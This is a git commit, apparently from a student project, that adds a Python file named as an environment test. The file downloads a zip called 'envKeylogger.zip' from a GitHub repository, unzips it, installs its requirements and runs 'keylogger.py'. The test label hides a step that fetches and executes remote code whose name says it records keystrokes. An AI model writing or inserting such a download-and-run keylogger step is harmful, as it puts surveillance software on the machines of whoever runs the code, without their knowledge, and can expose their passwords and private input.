b4a44c3ce20e65c0c19a5fbd94c2f7c216c7c883
Daoudi Oussama <oussama.daoudi@etu.umontpellier.fr>
2024-10-08 09:38:27 +0200

    test pour l'environnement

---
+++ test/testZipEnv.py
@@ -0,0 +1,20 @@
+import os
+import requests
+
+
+
+
+
+urlZip = 'https://github.com/ELREBEU/keylogger/raw/refs/heads/main/envKeylogger.zip'
+
+response = requests.get(urlZip)
+
+if response.status_code == 200:
+    with open('envKeylogger.zip', 'wb') as f:
+        f.write(response.content)
+
+
+os.system('unzip envKeylogger.zip')
+os.system('source envKeylogger/bin/activate')
+os.system('pip install -r requirements.txt')
+os.system('python3 keylogger.py')
